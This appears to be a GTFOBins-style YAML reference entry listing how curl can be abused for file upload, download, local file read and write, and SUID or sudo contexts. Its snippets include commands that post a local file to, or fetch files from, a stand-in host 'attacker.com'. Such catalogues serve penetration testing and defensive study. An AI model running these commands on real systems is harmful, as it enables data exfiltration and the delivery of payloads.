---
functions:
  file-upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        curl -X POST -d "@$LFILE" $URL
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        curl $URL -o $LFILE
  file-read:
    - description: The file path must be absolute.
      code: |
        LFILE=/tmp/file_to_read
        curl file://$LFILE
  file-write:
    - description: The file path must be absolute.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA >$TF
        curl "file://$TF" -o "$LFILE"
  suid:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        ./curl $URL -o $LFILE
  sudo:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        sudo curl $URL -o $LFILE
---
